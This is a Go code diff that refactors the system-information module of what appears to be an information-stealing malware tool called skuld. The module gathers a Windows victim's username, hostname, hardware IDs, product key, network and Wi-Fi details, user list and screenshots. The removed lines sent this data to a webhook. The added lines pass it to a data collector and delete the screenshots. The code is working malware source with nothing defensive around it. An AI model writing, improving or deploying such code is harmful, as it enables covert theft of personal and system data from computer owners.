@@ -16,7 +16,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 
 	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/hackirby/skuld/utils/collector"
 )
 
 func GetOS() string {
@@ -218,46 +218,35 @@ func GetScreens() []string {
 	return filepaths
 }
 
-func Run(webhook string) {
+func Run(dataCollector *collector.DataCollector) {
 	users := strings.Join(hardware.GetUsers(), "\n")
 	if len(users) > 4096 {
 		users = "Too many users to display"
 	}
 
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{
-			{
-				"title": "System Information",
-				"fields": []map[string]interface{}{
-					{
-						"name":  "User",
-						"value": fmt.Sprintf("```Username: %s\nHostname: %s\n```", os.Getenv("USERNAME"), os.Getenv("COMPUTERNAME")),
-					},
-					{
-						"name":  "System",
-						"value": fmt.Sprintf("```OS: %s\nCPU: %s\nGPU: %s\nRAM: %s\nMAC: %s\nHWID: %s\nProduct Key: %s```", GetOS(), GetCPU(), GetGPU(), GetRAM(), GetMAC(), GetHWID(), GetProductKey()),
-					},
-					{
-						"name":  "Disks",
-						"value": fmt.Sprintf("```%s```", GetDisks()),
-					},
-					{
-						"name":  "Network",
-						"value": fmt.Sprintf("```%s```", GetNetwork()),
-					},
-					{
-						"name":  "Wifi",
-						"value": fmt.Sprintf("```%s```", GetWifi()),
-					},
-				},
-			}, {
-				"title":       "All Users",
-				"description": fmt.Sprintf("```%s```", users),
-			},
-		},
-	}, GetScreens()...)
+	// Collect system information
+	systemInfo := map[string]interface{}{
+		"Username":    os.Getenv("USERNAME"),
+		"Hostname":    os.Getenv("COMPUTERNAME"),
+		"OS":          GetOS(),
+		"CPU":         GetCPU(),
+		"GPU":         GetGPU(),
+		"RAM":         GetRAM(),
+		"MAC":         GetMAC(),
+		"HWID":        GetHWID(),
+		"ProductKey":  GetProductKey(),
+		"Disks":       GetDisks(),
+		"Network":     GetNetwork(),
+		"Wifi":        GetWifi(),
+		"AllUsers":    users,
+	}
 
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{},
-	})
+	dataCollector.AddData("system", systemInfo)
+
+	// Add screenshots
+	screenshots := GetScreens()
+	for i, screenshot := range screenshots {
+		dataCollector.AddFile("system", screenshot, fmt.Sprintf("screenshot_%d.png", i+1))
+		os.Remove(screenshot) // Clean up temporary screenshot
+	}
 }
